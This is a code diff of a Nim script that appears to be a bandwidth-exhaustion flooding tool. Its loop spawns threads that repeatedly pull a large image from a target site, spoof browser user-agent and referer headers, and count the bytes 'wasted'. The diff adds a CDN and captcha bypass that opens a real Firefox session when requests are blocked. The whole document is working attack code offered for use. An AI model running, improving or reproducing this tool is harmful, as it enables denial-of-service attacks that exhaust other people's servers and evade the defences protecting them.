@@ -1,4 +1,13 @@
-import asynchttpserver, strutils, httpclient, threadpool, json, asyncdispatch, net
+import asynchttpserver, strutils, httpclient, threadpool, json, asyncdispatch, net, halonium
+
+var imInFight: bool = false
+
+proc inFight(target: string, userAgent: string): void =
+  {.cast(gcsafe).}:
+    imInFight = true
+    let session = createSession(Firefox,browserOptions=chromeOptions(args=["--user-agent=" & userAgent]))
+    session.navigate(target)
+    imInFight = false
 
 proc imgGrb(conType: string, target: string, targetImg: string, userAgent: string, range: int32, referer: string, timeout = 1200, log = false): bool =
   let client = newHttpClient(timeout = timeout)
@@ -61,11 +70,21 @@ var
   port: int32 = 443
   range: int64 = 100
   targetImg = "/static-assets/image/pages/home/devices/how-it-works/desktop/search-protection-back-dark.png"
+  userAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:135.0) Gecko/20100101 Firefox/135.0"
+  conType = "https://"
 
 while true:
   discard spawn sessionGrb(target, port, range, log = true)
-  var outPass = spawn imgGrb("https://", target, targetImg, "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:135.0) Gecko/20100101 Firefox/135.0", bitRange, "https://duckduckgo.com/")
+  var outPass = spawn imgGrb(conType, target, targetImg, userAgent, bitRange, "https://duckduckgo.com/")
   if ^outPass == true:
     bitWast += bitRange
     echo "Send keep-alive packet to -> " & target & "[" & targetImg & "," & intToStr(bitWast) & "]"
+  else:
+    if imInFight == false:
+      echo "maybe its blocked by cdn or etc. try solve captcha, js,... by yourself? [y/n]"
+      let userInput = stdin.readLine()
+      if userInput == "y":
+        spawn inFight(conType & target, userAgent)
+      elif userInput == "n":
+        discard
 ]#
